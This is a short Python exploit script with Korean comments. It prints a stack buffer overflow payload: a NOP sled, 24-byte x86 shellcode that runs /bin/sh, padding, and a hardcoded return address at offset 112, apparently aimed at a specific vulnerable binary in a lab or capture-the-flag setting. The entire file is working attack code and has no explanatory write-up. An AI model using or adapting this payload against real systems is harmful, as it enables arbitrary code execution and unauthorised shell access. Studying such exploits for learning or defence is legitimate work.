# payload.py
import sys

# /bin/sh를 실행하는 24바이트 x86 쉘코드
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
)

# buf(0xffffd39c) + 16 = 0xffffd3ac
ret_addr = b"\xac\xd3\xff\xff"

payload = (
    b"\x90" * 32  # 반환 주소가 착지할 NOP 영역
    + shellcode   # buf 시작점에서 32바이트 뒤
    + b"\x90" * 56  # 쉘코드의 push가 덮어써도 되는 영역
    + ret_addr    # 총 112바이트 뒤의 반환 주소
    + b"\n"
)

sys.stdout.buffer.write(payload)
